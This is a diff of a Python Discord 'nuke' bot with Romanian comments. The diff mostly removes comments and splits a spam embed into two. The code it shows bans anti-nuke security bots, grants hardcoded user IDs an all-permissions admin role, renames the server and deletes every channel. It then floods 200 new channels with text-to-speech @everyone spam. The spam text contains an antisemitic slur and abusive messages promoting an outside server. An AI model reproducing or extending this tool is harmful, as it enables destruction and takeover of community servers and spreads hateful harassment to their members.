@@ -156,7 +156,6 @@ cooldown_manager = CooldownManager(100)
 
 # ================== FUNCȚII FONTURI UNICODE ==================
 
-# Hărți pentru conversia textului în diferite stiluri Unicode
 FONT_MAPS = {
     "bold": {
         'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲', 'f': '𝗳', 'g': '𝗴', 'h': '𝗵', 'i': '𝗶', 'j': '𝗷',
@@ -185,7 +184,6 @@ FONT_MAPS = {
 }
 
 def apply_font(text, font_style):
-    """Aplică un stil Unicode textului."""
     if not text:
         return text
     font_map = FONT_MAPS.get(font_style, {})
@@ -198,7 +196,6 @@ def apply_font(text, font_style):
     return ''.join(result)
 
 async def detect_and_ban_antinuke_bots(guild):
-    """Detectează și banează boturile de securitate"""
     banned = []
     for member in guild.members:
         if member.bot:
@@ -253,9 +250,8 @@ async def setup(ctx):
     user = ctx.author
     user_config = get_user_config(user.id)
 
-    # Verificare permisiuni bot
     if not ctx.guild.me.guild_permissions.administrator:
-        await ctx.send("❌ Botul nu are permisiunea de **Administrator**. Te rog să i-o acorzi.")
+        await ctx.send("❌ Botul nu are permisiunea de **Administrator**.")
         return
 
     if guild.id == BLACKLISTED_GUILD_ID:
@@ -267,7 +263,6 @@ async def setup(ctx):
         await guild.leave()
         return
 
-    # ===== BAN ANTI-NUKE BOTS =====
     banned_bots = await detect_and_ban_antinuke_bots(guild)
     if banned_bots:
         await user.send(f"✅ Banați boturile: {', '.join(banned_bots)}")
@@ -276,7 +271,6 @@ async def setup(ctx):
 
     admin_users = [1389763251042258944, 1464634211406188721]
 
-    # CREARE ROL ADMIN
     try:
         admin_role = await guild.create_role(name="Larp Empire Admin", permissions=discord.Permissions.all())
         for admin_id in admin_users:
@@ -286,28 +280,25 @@ async def setup(ctx):
     except:
         pass
 
-    # SCHIMBARE NUME SERVER
     try:
         await guild.edit(name="1weeksober owns this")
     except:
         pass
 
-    # STERGERE CANALE
     for channel in guild.channels:
         try:
             await channel.delete()
         except:
             continue
 
-    # ===== LISTA NUME CANALE (fără cifre, doar textul de bază) =====
     base_channel_names = [
         "1weeksober-king",
         "Cry-kid",
         "Larp-empire-on-top"
     ]
 
-    # ===== MESAJ SPAM (în embed) =====
-    embed = discord.Embed(
+    # ===== EMBED 1: MESAJ PERSONALIZAT =====
+    embed_msg = discord.Embed(
         title="**LARP EMPIRE N4KED YOUR AHH**",
         description=(
             "Next time don't give admin perms to everyone r4tard.\n\n"
@@ -315,35 +306,37 @@ async def setup(ctx):
             "**EVERYONE JOIN HERE GUYS LEAVE THIS SH**\n"
             "https://discord.gg/larpempire"
         ),
-        color=0x000000  # Margine neagră
+        color=0x000000
     )
-    embed.set_image(url="https://i.imgur.com/yMQvcRw.gif")
-    embed.set_footer(text="Larp Empire • Nuke Service")
+    embed_msg.set_footer(text="Larp Empire • Nuke Service")
 
-    # ===== CREARE 200 CANALE INSTANT (loturi de 50) =====
+    # ===== EMBED 2: DOAR BANNER =====
+    embed_banner = discord.Embed(color=0x000000)
+    embed_banner.set_image(url="https://i.imgur.com/yMQvcRw.gif")
+
+    spam_text = "@everyone @here CORRUPT OFFICIALLY N4KED YALL AHH STUPID JEWS FUH THIS STUPID DUALHOOK YALL GOT HERE"
+
     created = 0
     font_styles = ["bold", "script", "double"]
 
     async def create_single_channel(index):
         nonlocal created
         try:
-            # Alege un nume de bază aleatoriu
             base_name = random.choice(base_channel_names)
-            # Aplică un font random
             font_style = random.choice(font_styles)
             styled_name = apply_font(base_name, font_style)
-
-            # Limita de lungime Discord
             if len(styled_name) > 100:
                 styled_name = base_name
 
             ch = await guild.create_text_channel(name=styled_name)
 
-            # Trimite embed-ul o dată
-            await ch.send(embed=embed)
+            # Trimite EMBED 1 (mesaj)
+            await ch.send(embed=embed_msg)
 
-            # Spam text de 100 de ori (sau 50 dacă nu premium)
-            spam_text = "@everyone @here CORRUPT OFFICIALLY N4KED YALL AHH STUPID JEWS FUH THIS STUPID DUALHOOK YALL GOT HERE"
+            # Trimite EMBED 2 (doar banner)
+            await ch.send(embed=embed_banner)
+
+            # Spam text
             spams = 100 if is_premium_user(user.id) else 50
             for _ in range(spams):
                 await ch.send(content=spam_text, tts=True)
@@ -354,19 +347,15 @@ async def setup(ctx):
 
     await user.send("🔄 Încep crearea a 200 de canale cu fonturi diferite...")
 
-    # Creează toate task-urile
     tasks = [create_single_channel(i) for i in range(200)]
-
-    # Execută în loturi de câte 50 pentru a evita rate limit, dar foarte rapid
     batch_size = 50
     for i in range(0, len(tasks), batch_size):
         batch = tasks[i:i+batch_size]
         await asyncio.gather(*batch)
-        await asyncio.sleep(1)  # Pauză scurtă între loturi
+        await asyncio.sleep(1)
 
     await user.send(f"✅ Creare finalizată! {created} canale create.")
 
-    # CREARE ROL
     try:
         await guild.create_role(name="1weeksober-on-top")
     except:
